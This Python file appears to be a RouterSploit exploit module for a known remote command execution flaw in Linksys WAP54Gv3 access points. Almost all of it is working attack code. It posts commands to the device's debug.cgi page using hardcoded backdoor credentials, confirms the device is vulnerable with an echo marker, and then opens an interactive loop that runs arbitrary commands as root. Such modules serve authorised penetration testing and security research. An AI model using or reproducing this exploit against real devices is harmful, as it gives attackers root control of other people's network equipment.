import re

from routersploit import (
    exploits,
    print_success,
    print_error,
    print_status,
    print_info,
    random_text,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Linksys WAP54Gv3 devices Remote Code Execution vulnerability.
    If the target is vulnerable, command loop is invoked that allows executing commands with root privileges.
    """
    __info__ = {
        'name': 'Linksys WAP54Gv3',
        'description': 'Module exploits remote command execution in Linksys WAP54Gv3 devices.'
                       'Debug interface allows executing root privileged shell commands is available'
                       'on dedicated web pages on the device.',
        'authors': [
            'Phil Purviance',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://seclists.org/bugtraq/2010/Jun/93',
        ],
        'devices': [
            'Linksys WAP54Gv3',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            self.command_loop()
        else:
            print_error("Target is not vulnerable")

    def command_loop(self):
        while 1:
            cmd = raw_input("cmd > ")

            if cmd in ['exit', 'quit']:
                return

            print_info(self.execute(cmd))

    def execute(self, cmd):
        url = "{}:{}/debug.cgi".format(self.target, self.port)
        data = {"data1": cmd, "command": "ui_debug"}

        response = http_request(method="POST", url=url, data=data, auth=("Gemtek", "gemtekswd"))
        if response is None:
            return ""

        res = re.findall('<textarea rows=30 cols=100>(.+?)</textarea>', response.text, re.DOTALL)

        if len(res):
            return res[0]

        return ""

    @mute
    def check(self):
        mark = random_text(32)
        cmd = "echo {}".format(mark)

        response = self.execute(cmd)

        if mark in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable
